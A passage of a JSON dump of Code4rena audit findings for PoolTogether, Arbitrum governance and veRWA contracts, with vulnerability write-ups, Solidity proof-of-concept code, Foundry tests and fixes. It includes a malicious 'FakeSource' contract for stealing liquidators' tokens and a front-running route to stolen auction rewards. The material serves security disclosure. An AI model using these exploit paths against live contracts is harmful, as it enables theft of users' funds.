minimum value compared to the current balance `_tokenOut.balanceOf(address(this))`. But the current balance includes the previously accumulated `boost.available`, so normally it should be compared to the difference between the current balance and `boost.available`.  so the value returned may be larger than the current balance, and `LiquidationPair.sol ` performs `source.liquidatableBalanceOf()` and `source.liquidate()` with too large a number, resulting in a failed transfer.  ## Tools Used  ## Recommended Mitigation Steps  The maximum value returned should not exceed the current balance   ```solidity   function _computeAvailable(IERC20 _tokenOut) internal view returns (uint256) {     Boost memory boost = _boosts[_tokenOut];     uint256 deltaTime = block.timestamp - boost.lastAccruedAt;     uint256 deltaAmount;     if (deltaTime == 0) {       return boost.available;     }     if (boost.tokensPerSecond > 0) {       deltaAmount = boost.tokensPerSecond * deltaTime;     }     if (boost.multiplierOfTotalSupplyPerSecond.unwrap() > 0) {       uint256 totalSupply = twabController.getTotalSupplyTwabBetween(address(vault), uint32(boost.lastAccruedAt), uint32(block.timestamp));       deltaAmount += convert(boost.multiplierOfTotalSupplyPerSecond.intoUD60x18().mul(convert(deltaTime)).mul(convert(totalSupply)));     }     uint256 availableBalance = _tokenOut.balanceOf(address(this)); -   deltaAmount = availableBalance > deltaAmount ? deltaAmount : availableBalance; -   return boost.available + deltaAmount; +   uint256 result = boost.available + deltaAmount; +   if (result > availableBalance) result = availableBalance; +   return result;    } ```   ## Assessed type  Context"}, {"title": "`rngComplete` function should only be called by `rngAuctionRelayer`", "html_url": "https://github.com/code-423n4/2023-08-pooltogether-findings/issues/82", "labels": ["bug", "3 (High Risk)", "high quality report", "primary issue", "selected for report", "sponsor confirmed", "edited-by-warden", "H-02"], "target": "2023-08-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-draw-auction/blob/f1c6d14a1772d6609de1870f8713fb79977d51c1/src/RngRelayAuction.sol#L131-L176   # Vulnerability details  ## Impact  The `rngComplete` function is supposed to be called by the relayer to complete the Rng relay auction and send auction rewards to the recipient, but because the function doesn't have any access control it can be called by anyone, an attacker can call the function before the relayer and give a different `_rewardRecipient` and thus he can collect all the rewards and the true auction reward recipient will not get any.  ## Proof of Concept  The issue occurs in the `rngComplete` function below :  ```solidity function rngComplete(     uint256 _randomNumber,     uint256 _rngCompletedAt,     address _rewardRecipient, // @audit can set any address     uint32 _sequenceId,     AuctionResult calldata _rngAuctionResult ) external returns (bytes32) {     // @audit should only be callable by rngAuctionRelayer     if (_sequenceHasCompleted(_sequenceId)) revert SequenceAlreadyCompleted();     uint64 _auctionElapsedSeconds = uint64(         block.timestamp < _rngCompletedAt ? 0 : block.timestamp - _rngCompletedAt     );     if (_auctionElapsedSeconds > (_auctionDurationSeconds - 1)) revert AuctionExpired();     // Calculate the reward fraction and set the draw auction results     UD2x18 rewardFraction = _fractionalReward(_auctionElapsedSeconds);     _auctionResults.rewardFraction = rewardFraction;     _auctionResults.recipient = _rewardRecipient;     _lastSequenceId = _sequenceId;      AuctionResult[] memory auctionResults = new AuctionResult[](2);     auctionResults[0] = _rngAuctionResult;     auctionResults[1] = AuctionResult({         rewardFraction: rewardFraction,         recipient: _rewardRecipient     });      uint32 drawId = prizePool.closeDraw(_randomNumber);      uint256 futureReserve = prizePool.reserve() + prizePool.reserveForOpenDraw();     uint256[] memory _rewards = RewardLib.rewards(auctionResults, futureReserve);      emit RngSequenceCompleted(         _sequenceId,         drawId,         _rewardRecipient,         _auctionElapsedSeconds,         rewardFraction     );      for (uint8 i = 0; i < _rewards.length; i++) {         uint104 _reward = uint104(_rewards[i]);          if (_reward > 0) {             prizePool.withdrawReserve(auctionResults[i].recipient, _reward);             emit AuctionRewardDistributed(_sequenceId, auctionResults[i].recipient, i, _reward);         }     }      return bytes32(uint(drawId)); } ```  As we can see the function does not have any access control (modifier or check on the msg.sender), so any user can call it and you can also notice that the `_rewardRecipient` (the address that receives the rewards) is given as argument to the function and there is no check to verify that it is the correct auction reward receiver.   Hence an attacker can call the function before the relayer does, he can thus complete the auction and give another address for `_rewardRecipient` which will receive all the rewards.  The result is in the end that the true auction reward recipient will get his reward stolen by other users.  ## Tools Used  Manual review  ## Recommended Mitigation Steps  Add a check in the `rngComplete` function to make sure that only the relayer can call it, the function can be modified as follows :  ```solidity function rngComplete(     uint256 _randomNumber,     uint256 _rngCompletedAt,     address _rewardRecipient,      uint32 _sequenceId,     AuctionResult calldata _rngAuctionResult ) external returns (bytes32) {     // @audit only called by rngAuctionRelayer     if (msg.sender != rngAuctionRelayer) revert NotRelayer();     ... } ```   ## Assessed type  Access Control"}, {"title": "Liquidators can be tricked to operate with LiquidationPairs that were deployed using the LiquidationPairFactory but they configured the LiquidationSource as a fake malicious contract", "html_url": "https://github.com/code-423n4/2023-08-pooltogether-findings/issues/68", "labels": ["bug", "2 (Med Risk)", "high quality report", "primary issue", "selected for report", "sponsor confirmed", "M-07"], "target": "2023-08-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-cgda-liquidator/blob/7f95bcacd4a566c2becb98d55c1886cadbaa8897/src/LiquidationPairFactory.sol#L65-L108   # Vulnerability details  ## Impact - Users and Bots can be tricked into operating with LiquidationPairs that were deployed using the LiquidationPairFactory but they configured the LiquidationSource as a fake malicious contract that will allow the Liquidator's creator to steal all the POOL tokens that were meant to be used to liquidate the Vault's Yield  ## Proof of Concept - The current implementation of the [`LiquidationPairFactory::createPair()`](https://github.com/GenerationSoftware/pt-v5-cgda-liquidator/blob/7f95bcacd4a566c2becb98d55c1886cadbaa8897/src/LiquidationPairFactory.sol#L65-L108) allows the callers to set the LiquidationSource as any arbitrary address with no restrictions. - The problem is that the address of the `_source` parameter may not necessarily be a real vault contract, and even though the `_source` address is set as a fake malicious contract, the LiquidationPair will be created and added to the `deployedPairs` mapping, and [as stated in the protocol's documentation, **any LiquidationPair created by the factory determines if a pair is legitimate or not**](https://dev.pooltogether.com/protocol/next/guides/liquidating-yield#find-the-liquidation-pair)  ![Liquidation Pair Protocol's Documentation](https://res.cloudinary.com/djt3zbrr3/image/upload/v1691397160/PoolTogether/LiquidationPairFactory_Documentation.png)  - So, if a LiquidationPair is created by the LiquidationPairFactory may allow malicious users to trick users who want to liquidate the Vault's Yield to operate with a LiquidationPair who'll end up stealing their POOL tokens (tokenIn) when swapping tokens.  - Practical Example of how the LiquidationPair would steal the user's assets, (Keep in mind that `source` is not the address of a Vault, but an arbitrary contract)   - The fake `source` contract would look like this: ```solidity contract FakeSource {    function targetOf(address _token) external view returns (address) {     return <ContractCreatorAddress>;   }    function liquidate(     address _account,     address _tokenIn,     uint256 _amountIn,     address _tokenOut,     uint256 _amountOut   ) public virtual override returns (bool) {     return true;   }  }  ``` 1. Calling [`LiquidationPair.target()`](https://github.com/GenerationSoftware/pt-v5-cgda-liquidator/blob/7f95bcacd4a566c2becb98d55c1886cadbaa8897/src/LiquidationRouter.sol#L71) will return `source.targetOf(tokenIn)`, and the `source` contract can return any address when the `targetOf()` is called, so, let's say that will return the address of its creator.   - so, `LiquidationPair.target()` will return the address of its creator, instead of returning the expected address of the `PrizePool` contract  2. Calling [`LiquidationPair::swapExactAmount()`](https://github.com/GenerationSoftware/pt-v5-cgda-liquidator/blob/7f95bcacd4a566c2becb98d55c1886cadbaa8897/src/LiquidationRouter.sol#L75) will do some computations prior to call `source.liquidate()`, and the `source.liquidate()` can just return true not to cause the tx to be reverted.   - So, `LiquidationPair::swapExactAmount()` will basically do nothing.   - With the above points in mind, let's see what would be the result of swapping using the LiquidationRouter contract ```solidity function swapExactAmountOut(   LiquidationPair _liquidationPair,   address _receiver,   uint256 _amountOut,   uint256 _amountInMax ) external onlyTrustedLiquidationPair(_liquidationPair) returns (uint256) {    //@audit-issue => The `tokenIn` will be transferred to the address of the LiquidationPair's creator instead of the PrizePool contract (Point 1) <====== Point 1 ======>   IERC20(_liquidationPair.tokenIn()).safeTransferFrom(     msg.sender,     _liquidationPair.target(),     _liquidationPair.computeExactAmountIn(_amountOut)   );    //@audit-issue => This call will basically do nothing, just return a true not to cause the tx to be reverted (Point 2)  <====== Point 2 ======>   uint256 amountIn = _liquidationPair.swapExactAmountOut(_receiver, _amountOut, _amountInMax);    emit SwappedExactAmountOut(_liquidationPair, _receiver, _amountOut, _amountInMax, amountIn);    return amountIn; } ```  ## Tools Used Manual Audit  ## Recommended Mitigation Steps - Use the `deployedVaults` mapping of the `VaultFactory` contract to validate if the inputted address of the `_source` parameter is a valid vault supported by the Protocol.   - Additionally, it could be a good idea to set the `_tokenIn` and `_tokenOut` by pulling the values that are already set up in the vault.  ```solidity function createPair(   ILiquidationSource _source, - address _tokenIn, - address _tokenOut,   uint32 _periodLength,   uint32 _periodOffset,   uint32 _targetFirstSaleTime,   SD59x18 _decayConstant,   uint112 _initialAmountIn,   uint112 _initialAmountOut,   uint256 _minimumAuctionAmount ) external returns (LiquidationPair) {  + require(VaultFactory.deployedVaults(address(_source)) == true, \"_source address is not a supported Vault\"); + address _prizePool = _source.prizePool(); + address _tokenIn = _prizePool.prizeToken(); + address _tokenOut = address(_source);      LiquidationPair _liquidationPair = new LiquidationPair(     _source,     _tokenIn,     _tokenOut,     _periodLength,     _periodOffset,     _targetFirstSaleTime,     _decayConstant,     _initialAmountIn,     _initialAmountOut,     _minimumAuctionAmount   );    allPairs.push(_liquidationPair);   deployedPairs[_liquidationPair] = true;    emit PairCreated(     _liquidationPair,     _source,     _tokenIn,     _tokenOut,     _periodLength,     _periodOffset,     _targetFirstSaleTime,     _decayConstant,     _initialAmountIn,     _initialAmountOut,     _minimumAuctionAmount   );    return _liquidationPair; }  ```   ## Assessed type  Invalid Validation"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-08-pooltogether-findings/issues/49", "labels": ["bug", "grade-a", "high quality report", "QA (Quality Assurance)", "selected for report", "sponsor confirmed", "edited-by-warden", "Q-04"], "target": "2023-08-pooltogether-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-08-pooltogether-findings/blob/main/data/0xmystery-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-08-pooltogether-findings/issues/47", "labels": ["bug", "G (Gas Optimization)", "grade-a", "high quality report", "selected for report", "sponsor confirmed", "G-14"], "target": "2023-08-pooltogether-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-08-pooltogether-findings/blob/main/data/Rolezn-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-08-pooltogether-findings/issues/46", "labels": ["bug", "grade-a", "high quality report", "QA (Quality Assurance)", "sponsor confirmed", "Q-05"], "target": "2023-08-pooltogether-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-08-pooltogether-findings/blob/main/data/Rolezn-Q.md)."}, {"title": "The ContinuousGDA implementation is incorrect leading to liquidation auctions running at the wrong price", "html_url": "https://github.com/code-423n4/2023-08-pooltogether-findings/issues/24", "labels": ["bug", "2 (Med Risk)", "high quality report", "primary issue", "selected for report", "sponsor confirmed", "edited-by-warden", "M-10"], "target": "2023-08-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-cgda-liquidator/blob/7f95bcacd4a566c2becb98d55c1886cadbaa8897/src/libraries/ContinuousGDA.sol#L39-L41 https://github.com/GenerationSoftware/pt-v5-cgda-liquidator/blob/7f95bcacd4a566c2becb98d55c1886cadbaa8897/src/libraries/ContinuousGDA.sol#L65 https://github.com/GenerationSoftware/pt-v5-cgda-liquidator/blob/7f95bcacd4a566c2becb98d55c1886cadbaa8897/src/libraries/ContinuousGDA.sol#L86   # Vulnerability details  ## Impact The `LiquidationPair` contract facilitates Periodic Continuous Gradual Dutch Auctions for yield. This uses the underlying `ContinuousGDA.sol` library in order to correctly price the auctions.  However this library incorrectly implements the formula, using the emission rate in a few places where it should use the decay constant. Since the decay constant is usually less than the emission rate (as can also be seen from the test suite), this means that the `purchasePrice` calculation is lower than it should be, meaning that liquidations are over-incentivised.  ## Proof of Concept This is difficult to demonstrate given the issue is basically just that the formula in https://www.paradigm.xyz/2022/04/gda has been wrongly implemented. However I'll point out a few issues in the code:  ```   function purchasePrice(     SD59x18 _amount,     SD59x18 _emissionRate,     SD59x18 _k,     SD59x18 _decayConstant,     SD59x18 _timeSinceLastAuctionStart   ) internal pure returns (SD59x18) {     if (_amount.unwrap() == 0) {       return SD59x18.wrap(0);     }     SD59x18 topE = _decayConstant.mul(_amount).div(_emissionRate);     topE = topE.exp().sub(ONE);     SD59x18 bottomE = _decayConstant.mul(_timeSinceLastAuctionStart);     bottomE = bottomE.exp();     SD59x18 result;     if (_emissionRate.unwrap() > 1e18) {       result = _k.div(_emissionRate).mul(topE).div(bottomE);     } else {       result = _k.mul(topE.div(_emissionRate.mul(bottomE)));     }     return result;   } ```  In the `result` calculation you can see that `_k` is divided by `_emissionRate`. However, according to the proper formula, `_k` should be divided by `_decayConstant`.  Another issue occurs in `purchaseAmount` where `_k` is added to `lnParam` instead of ONE and `price` is multiplied by `_emissionRate` instead of `_decayConstant`:   ```   function purchaseAmount(     SD59x18 _price,     SD59x18 _emissionRate,     SD59x18 _k,     SD59x18 _decayConstant,     SD59x18 _timeSinceLastAuctionStart   ) internal pure returns (SD59x18) {     if (_price.unwrap() == 0) {       return SD59x18.wrap(0);     }     SD59x18 exp = _decayConstant.mul(_timeSinceLastAuctionStart).exp();     SD59x18 lnParam = _k.add(_price.mul(_emissionRate).mul(exp)).div(_k);     SD59x18 numerator = _emissionRate.mul(lnParam.ln());     SD59x18 amount = numerator.div(_decayConstant);     return amount;   } ```  I would suggest double checking the formula and the derivation of the complementary formulas to calculate amount/k. The correct implementation is show in the diff below.  ## Tools Used Manual review  ## Recommended Mitigation Steps The implementation should be updated to correctly calculate the price for a continuous GDA. I have made the required fixes in the diff below:  ``` diff --git a/src/libraries/ContinuousGDA.sol b/src/libraries/ContinuousGDA.sol index 721d626..7e2bb61 100644 --- a/src/libraries/ContinuousGDA.sol +++ b/src/libraries/ContinuousGDA.sol @@ -36,9 +36,9 @@ library ContinuousGDA {      bottomE = bottomE.exp();      SD59x18 result;      if (_emissionRate.unwrap() > 1e18) { -      result = _k.div(_emissionRate).mul(topE).div(bottomE); +      result = _k.div(_decayConstant).mul(topE).div(bottomE);      } else { -      result = _k.mul(topE.div(_emissionRate.mul(bottomE))); +      result = _k.mul(topE.div(_decayConstant.mul(bottomE)));      }      return result;    } @@ -62,7 +62,7 @@ library ContinuousGDA {        return SD59x18.wrap(0);      }      SD59x18 exp = _decayConstant.mul(_timeSinceLastAuctionStart).exp(); -    SD59x18 lnParam = _k.add(_price.mul(_emissionRate).mul(exp)).div(_k); +    SD59x18 lnParam = ONE.add(_price.mul(_decayConstant).mul(exp)).div(_k);      SD59x18 numerator = _emissionRate.mul(lnParam.ln());      SD59x18 amount = numerator.div(_decayConstant);      return amount; @@ -83,7 +83,7 @@ library ContinuousGDA {    ) internal pure returns (SD59x18) {      SD59x18 exponent = _decayConstant.mul(_targetFirstSaleTime);      SD59x18 eValue = exponent.exp(); -    SD59x18 multiplier = _emissionRate.mul(_price); +    SD59x18 multiplier = _decayConstant.mul(_price);      SD59x18 denominator = (_decayConstant.mul(_purchaseAmount).div(_emissionRate)).exp().sub(ONE);      SD59x18 result = eValue.div(denominator);      return result.mul(multiplier);  ```      ## Assessed type  Math"}, {"title": "`VaultBooster`: users tokens will be stuck if they deposited with unsupported boost tokens", "html_url": "https://github.com/code-423n4/2023-08-pooltogether-findings/issues/22", "labels": ["bug", "2 (Med Risk)", "high quality report", "primary issue", "selected for report", "sponsor confirmed", "M-11"], "target": "2023-08-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-vault-boost/blob/9d640051ab61a0fdbcc9500814b7f8242db9aec2/src/VaultBooster.sol#L171-L176   # Vulnerability details  ## Impact - In `VaultBooster` contract : users can deposite their tokens to participate in boosting the chances of a vault winning. - But in `deposit` function: users can deposit **any** ERC20 tokens without verifying if the token is supported or not (has a boost set to it; registered in `_boosts[_token]`).  - As there's no mechanism implemented in the contract for users to retreive their deposited tokens if these tokens are not supported; then they will lose them unless withdrawn by the `VaultBooster` owner; and then the owner transfers these tokens back to the users. - If this behaviour is intended by design; then there must be a machanism to save unsupported deposited tokens with user address and amount; and another withdraw function accessible by the owner that enables transferring stuck tokens to their owners; or simply make `deposit` function reverts if the token is unsupported.  ## Proof of Concept  - Code:  [Line 171-176](https://github.com/GenerationSoftware/pt-v5-vault-boost/blob/9d640051ab61a0fdbcc9500814b7f8242db9aec2/src/VaultBooster.sol#L171-L176)  ```solidity File: pt-v5-vault-boost/src/VaultBooster.sol Line 171-176:   function deposit(IERC20 _token, uint256 _amount) external {     _accrue(_token);     _token.safeTransferFrom(msg.sender, address(this), _amount);      emit Deposited(_token, msg.sender, _amount);   } ```  - Foundry PoC:  1. A `MockERC20.t.sol` contract is added to the test folder to simulate the user experience (miting/approving..),  ```solidity pragma solidity 0.8.19;  import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";  contract MockERC20 is ERC20 {   constructor() ERC20(\"MockToken\", \"MT\") {}    function mint(address account, uint256 amount) public returns (bool) {     _mint(account, amount);     return true;   } } ```  add remappings to the `foundry.toml`:    remappings = [\"@openzeppelin/=lib/openzeppelin-contracts/\"]  2.  This test is set in `VaultBooster.t.sol` file, where a user deposits unsuppotred token (basically no boosts were set),tries to liquidate but the call will revert, then the unsupported tokens can be withdrawn by the owner only (and not transferred to the original depositor):     add this import line at the top of the test file:  ```solidity import \"./MockERC20.t.sol\"; ```  add this test `testDepositWithUnsupportedToken()` to the `VaultBooster.t.sol` file:  ```solidity   function testDepositWithUnsupportedToken() public {     //0- minting unsupportedToken to the user     address user = address(0x2);     uint256 userBalance = 1e18;     MockERC20 unsupportedToken = new MockERC20();     vm.startPrank(user);     unsupportedToken.mint(user, userBalance);     assertEq(unsupportedToken.balanceOf(user), userBalance);      //1.the user deposits unsupported token (mainly there's no boosts set for any tokens):     unsupportedToken.approve(address(booster), userBalance);      vm.expectEmit(true, true, true, true);     emit Deposited(unsupportedToken, user, userBalance);     booster.deposit(unsupportedToken, userBalance);     assertEq(unsupportedToken.balanceOf(user), 0);     assertEq(unsupportedToken.balanceOf(address(booster)), userBalance);      //2. assertions that the deposited unsupportedToken doesn't have a boost set for it:     Boost memory boost = booster.getBoost(unsupportedToken);     assertEq(boost.liquidationPair, address(0));     assertEq(boost.multiplierOfTotalSupplyPerSecond.unwrap(), 0, \"multiplier\");     assertEq(boost.tokensPerSecond, 0, \"tokensPerSecond\");     assertEq(boost.lastAccruedAt, block.timestamp); //as the deposit function accrues rewards for the deposited token boost      //3. the user tries to call liquidate to get back his tokens,but the call will revert as there's no boost set for this token (it's unsupported):     vm.expectRevert(abi.encodeWithSelector(OnlyLiquidationPair.selector));     booster.liquidate(user, address(prizeToken), 0, address(unsupportedToken), userBalance);     vm.stopPrank();      //4. unless the owner tries  withdraws the user stuck tokens,(these tokens will be transferred to the owner address not to the original depositor address) :     assertEq(unsupportedToken.balanceOf(address(this)), 0);     assertEq(unsupportedToken.balanceOf(address(booster)), userBalance);     booster.withdraw(unsupportedToken, userBalance);     assertEq(unsupportedToken.balanceOf(address(this)), userBalance);     assertEq(unsupportedToken.balanceOf(address(booster)), 0);   } ```  3. Test result:  ```bash $ forge test --match-test testDepositWithUnsupportedToken Running 1 test for test/VaultBooster.t.sol:VaultBoosterTest [PASS] testDepositWithUnsupportedToken() (gas: 636179) Test result: ok. 1 passed; 0 failed; finished in 3.36ms ```  ## Tools Used  Manual Testing & Foundry.  ## Recommended Mitigation Steps  Update `deposit` function to revert if the user tries to deposit unsuppoerted tokens (that doesn't have a boost set):  ```diff   function deposit(IERC20 _token, uint256 _amount) external { +    if(_boosts[_token].liquidationPair==address(0)) revert();     _accrue(_token);     _token.safeTransferFrom(msg.sender, address(this), _amount);      emit Deposited(_token, msg.sender, _amount);   } ```   ## Assessed type  Token-Transfer"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-08-arbitrum-findings/issues/248", "labels": ["bug", "G (Gas Optimization)", "grade-a", "high quality report", "sponsor confirmed", "G-04"], "target": "2023-08-arbitrum-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-08-arbitrum-findings/blob/main/data/JCK-G.md)."}, {"title": "SecurityCouncilNomineeElectionGovernor might have to wait for more than 6 months to create election again", "html_url": "https://github.com/code-423n4/2023-08-arbitrum-findings/issues/182", "labels": ["bug", "2 (Med Risk)", "high quality report", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-02"], "target": "2023-08-arbitrum-findings", "body": "# Lines of code  https://github.com/ArbitrumFoundation/governance/blob/c18de53820c505fc459f766c1b224810eaeaabc5/src/security-council-mgmt/governors/modules/SecurityCouncilNomineeElectionGovernorTiming.sol#L75-#L94   # Vulnerability details  ## Impact - SecurityCouncilNomineeElectionGovernor might have to wait for more than 6 months to create election again  ## Proof of Concept According to the document https://forum.arbitrum.foundation/t/proposal-security-council-elections-proposed-implementation-spec/15425/1#h-1-nominee-selection-7-days-10, security council election can be create every 6 months. Contract `SecurityCouncilNomineeElectionGovernor` implements this by these codes: ```solidity  function createElection() external returns (uint256 proposalId) {         // require that the last member election has executed         _requireLastMemberElectionHasExecuted();          // each election has a deterministic start time         uint256 thisElectionStartTs = electionToTimestamp(electionCount);         if (block.timestamp < thisElectionStartTs) {             revert CreateTooEarly(block.timestamp, thisElectionStartTs);         }         ... }      function electionToTimestamp(uint256 electionIndex) public view returns (uint256) {         // subtract one to make month 0 indexed         uint256 month = firstNominationStartDate.month - 1;          month += 6 * electionIndex;         uint256 year = firstNominationStartDate.year + month / 12;         month = month % 12;          // add one to make month 1 indexed         month += 1;          return DateTimeLib.dateTimeToTimestamp({             year: year,             month: month,             day: firstNominationStartDate.day,             hour: firstNominationStartDate.hour,             minute: 0,             second: 0         });     }  ``` If `electionIndex` = 1, function `createElection` will call `electionToTimestamp` to calculate for timestamp 6 months from `firstNominationStartDate`. However, the code uses `firstNominationStartDate.day` to form the result day: ```solidity         return DateTimeLib.dateTimeToTimestamp({             year: year,             month: month,             day: firstNominationStartDate.day,             hour: firstNominationStartDate.hour,             minute: 0,             second: 0         }); ``` This could result in wrong calculation because the day in months can varies from 28-31. Therefore, the worst case is that the user has to wait for 6 months + 4 more days to create new election.   For example, if `firstNominationStartDate` = 2024-08-31-01:00:00 (which is the last day of August). The user might expect that they can create election again 6 months from that, which mean 1:00 AM of the last day of February 2025 (which is 2025-02-28-01:00:00), but in fact the  result of `electionToTimestamp` would be 2025-03-03-01:00:00, 4 days from that.  Below is POC for the above example, for easy of testing, place this test case in file `test/security-council-mgmt/governors/SecurityCouncilNomineeElectionGovernor.t.sol` under contract `SecurityCouncilNomineeElectionGovernorTest` and run it using command: `forge test --match-path test/security-council-mgmt/governors/SecurityCouncilNomineeElectionGovernor.t.sol --match-test testDateTime -vvvv`  ```solidity     function testDateTime() public {         // Deploy a new governor         // with first nomination start date = 2024-08-30T01:00         SecurityCouncilNomineeElectionGovernor  newGovernor = _deployGovernor();          SecurityCouncilNomineeElectionGovernor.InitParams memory newInitParams         = SecurityCouncilNomineeElectionGovernor.InitParams({             firstNominationStartDate: Date({year: 2024, month: 8, day:31, hour:1}),             nomineeVettingDuration: 1 days,             nomineeVetter: address(0x11),             securityCouncilManager: ISecurityCouncilManager(address(0x22)),             securityCouncilMemberElectionGovernor: ISecurityCouncilMemberElectionGovernor(                 payable(address(0x33))             ),             token: IVotesUpgradeable(address(0x44)),             owner: address(0x55),             quorumNumeratorValue: 20,             votingPeriod: 1 days         });          // The next selection is not available until timestamp 1740963600,         // which is 2025-03-03T1:00:00 AM GMT         newGovernor.initialize(newInitParams);         assertEq(newGovernor.electionToTimestamp(1), 1740963600);      } ``` You can use an online tool like https://www.epochconverter.com/ to check that `1740963600` is ` Monday, March 3, 2025 1:00:00 AM GMT`   ## Tools Used Manual review  ## Recommended Mitigation Steps I recommend fixing the math so that the duration between elections are exactly 6 months like documented.      ## Assessed type  Math"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-08-arbitrum-findings/issues/147", "labels": ["bug", "grade-a", "high quality report", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-11"], "target": "2023-08-arbitrum-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-08-arbitrum-findings/blob/main/data/ktg-Q.md)."}, {"title": "SecurityCouncilNomineeElectionGovernor vetting period will be shorten each election", "html_url": "https://github.com/code-423n4/2023-08-arbitrum-findings/issues/80", "labels": ["bug", "disagree with severity", "downgraded by judge", "grade-a", "primary issue", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden"], "target": "2023-08-arbitrum-findings", "body": "# Lines of code  https://github.com/ArbitrumFoundation/governance/blob/c18de53820c505fc459f766c1b224810eaeaabc5/src/security-council-mgmt/governors/SecurityCouncilNomineeElectionGovernor.sol##L151-#L153   # Vulnerability details  ## Impact - SecurityCouncilNomineeElectionGovernor vetting period will be shorten each election - No function to update vetting period  ## Proof of Concept The document for nominee election https://forum.arbitrum.foundation/t/proposal-security-council-elections-proposed-implementation-spec/15425/1#election-stages-in-detail-9 specifies the *Nominee selection* is 7 days long and *Compliance check by the Foundation* is 14 days long. However, contract `SecurityCouncilNomineeElectionGovernor` always expresses these durations using block numbers. For example the `onlyVettingPeriod` modifier: ```solidity modifier onlyVettingPeriod(uint256 proposalId) {         // voting is over and the proposal must have succeeded, not active or executed         ProposalState state_ = state(proposalId);         if (state_ != ProposalState.Succeeded) {             revert ProposalNotSucceededState(state_);         }          // the proposal must not have passed the vetting deadline         uint256 vettingDeadline = proposalVettingDeadline(proposalId);         if (block.number > vettingDeadline) {             revert ProposalNotInVettingPeriod(block.number, vettingDeadline);         }          _;     } ```  According to the stats here, https://ycharts.com/indicators/ethereum_blocks_per_day, the blocks per day in  Ethereum has increased by 11.4% from last year. This means if for example vetting period is set a number of blocks for 14 days in 2022, by now it's only equal to 12 days; which means the vetting duration is shorten by 2 days.  **I understand that the contract inherit openzeppelin's GovernorUpgradeable contract and it uses block.number by default**. However, the impact is still that these periods will be shorten. An important thing I want to mention here is that variable `nomineeVettingDuration` in contract `SecurityCouncilNomineeElectionGovernorTiming` is only set at initialization, and there's no other function to update it:  ```solidity function __SecurityCouncilNomineeElectionGovernorTiming_init(         Date memory _firstNominationStartDate,         uint256 _nomineeVettingDuration     ) internal onlyInitializing {         ...         firstNominationStartDate = _firstNominationStartDate;         nomineeVettingDuration = _nomineeVettingDuration;     } ``` Unlike `fullWeightDuration` in `SecurityCouncilMemberElectionGovernorCountingUpgradeable` (this is the *Member election* period documented in this https://forum.arbitrum.foundation/t/proposal-security-council-elections-proposed-implementation-spec/15425/1#h-3-member-election-21-days-14), can be updated using function `setFullWeightDuration`  ```     function setFullWeightDuration(uint256 newFullWeightDuration) public onlyGovernance {         if (newFullWeightDuration > votingPeriod()) {             revert FullWeightDurationGreaterThanVotingPeriod(newFullWeightDuration, votingPeriod());         }          fullWeightDuration = newFullWeightDuration;         emit FullWeightDurationSet(newFullWeightDuration);     } ```  ## Tools Used Manual review  ## Recommended Mitigation Steps If you have the intention to keep using block numbers as durations, I think the best way is to provide a function to update `nomineeVettingDuration` similar to `setFullWeightDuration`. After that, all 3 variables related to durations `votingPeriod`, `nomineeVettingDuration` and `setFullWeightDuration` can be updated. Elections only happen every 6-12 months so prior to every election, an authorized user can update these values using latest average block number per day so that those durations will matched their specification.         ## Assessed type  Governance"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-08-arbitrum-findings/issues/50", "labels": ["bug", "G (Gas Optimization)", "high quality report", "selected for report", "sponsor confirmed", "edited-by-warden", "G-12"], "target": "2023-08-arbitrum-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-08-arbitrum-findings/blob/main/data/LeoS-G.md)."}, {"title": "Delegators can delegate to a expired or withdrawn lock", "html_url": "https://github.com/code-423n4/2023-08-verwa-findings/issues/338", "labels": ["bug", "downgraded by judge", "grade-a", "QA (Quality Assurance)", "satisfactory", "sponsor confirmed"], "target": "2023-08-verwa-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-08-verwa/blob/main/src/VotingEscrow.sol#L356 https://github.com/code-423n4/2023-08-verwa/blob/main/src/VotingEscrow.sol#L301 https://github.com/code-423n4/2023-08-verwa/blob/main/src/VotingEscrow.sol#L337   # Vulnerability details  ## Impact Users can delegate to an expired or withdrawn lock, making their voting power wasted.  ## Proof of Concept In delegate(), we ensure the toLocked.end >= fromLocked.end, preventing a user to delegate on a lock that will expire before him:  ```solidity     function delegate(address _addr) external nonReentrant {         //....         require(toLocked.end >= fromLocked.end, \"Only delegate to longer lock\"); ```  However, in increaseAmount(), we increase the newLocked.end by 5 years and directly update the msg.sender's lock, not checking whether it currently delegating on another lock:  ```solidity     function increaseAmount(uint256 _value) external payable nonReentrant {         // ....         newLocked.amount += int128(int256(_value));         newLocked.end = _floorToWeek(block.timestamp + LOCKTIME);         if (delegatee == msg.sender) {         //....         } else {             // Delegated lock, update sender's lock first             locked[msg.sender] = newLocked; // <----- ```  So delegators can delegate to an expired lock:  1. user2.end > user1.end and user1 delegate to user2. 2. user1 increases his locked value, and user1.end += 5 years, user1.end > user2.end 3. When block.timestamp > user2.end, user2's lock is expired, but user1 still delegates on user2.  Also, in withdraw(), we allow there are delegated power left: ```solidity     function withdraw() external nonReentrant {         //....         newLocked.end = 0;         newLocked.delegated -= int128(int256(amountToSend)); // <---- ```   So users can delegate to a withdrawn lock in this situation.  PoC:  ```solidity     // src/test/VotingEscrow.t.sol     function testDelegateExpiredLock() public {         // withdraw for delegated lock         testSuccessDelegate();                  (, uint256 end, , ) = 